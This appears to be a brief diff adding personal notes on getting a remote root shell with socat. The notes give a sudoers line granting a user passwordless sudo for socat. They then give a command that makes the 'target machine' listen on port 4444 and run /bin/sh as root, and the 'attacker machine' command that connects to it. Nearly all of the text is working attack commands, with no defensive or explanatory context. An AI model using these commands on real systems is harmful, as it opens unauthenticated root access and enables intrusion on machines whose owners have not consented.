@@ -1,0 +1,11 @@
+to add the user permission
+sudo nano /etc/sudoers
+
+ex:
+arul  ALL=(ALL) NOPASSWD: /usr/bin/socat
+
+To run target machine 
+sudo socat TCP4-LISTEN:4444,reuseaddr EXEC:"/bin/sh"
+
+attacker machine
+socat - TCP4:192.168.123.160:4444
